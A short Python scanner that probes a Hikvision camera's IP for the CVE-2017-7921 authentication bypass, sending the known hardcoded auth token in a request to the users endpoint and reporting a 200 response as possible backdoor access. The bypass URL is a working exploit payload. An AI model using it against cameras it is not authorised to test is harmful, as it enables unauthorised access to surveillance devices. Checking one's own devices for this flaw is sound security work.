# hikvision_vuln_scanner.py
import requests
import xml.etree.ElementTree as ET

class HikvisionVulnScanner:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.vulnerabilities = []
    
    def check_backdoor_access(self):
        """Check for common backdoor vulnerabilities"""
        # CVE-2017-7921 - Authentication Bypass
        urls_to_check = [
            f"http://{self.target_ip}/Security/users?auth=YWRtaW46MTEK",
            f"http://{self.target_ip}/System/deviceInfo", 
        ]
        
        for url in urls_to_check:
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    self.vulnerabilities.append(f"Backdoor access possible: {url}")
            except:
                pass
    
    def run_scan(self):
        print("🔍 Scanning for Hikvision vulnerabilities...")
        self.check_backdoor_access()
        
        if self.vulnerabilities:
            print("🚨 VULNERABILITIES FOUND:")
            for vuln in self.vulnerabilities:
                print(f"   • {vuln}")
        else:
            print("✅ No obvious vulnerabilities detected")

# Usage
scanner = HikvisionVulnScanner("192.168.1.100")
scanner.run_scan()
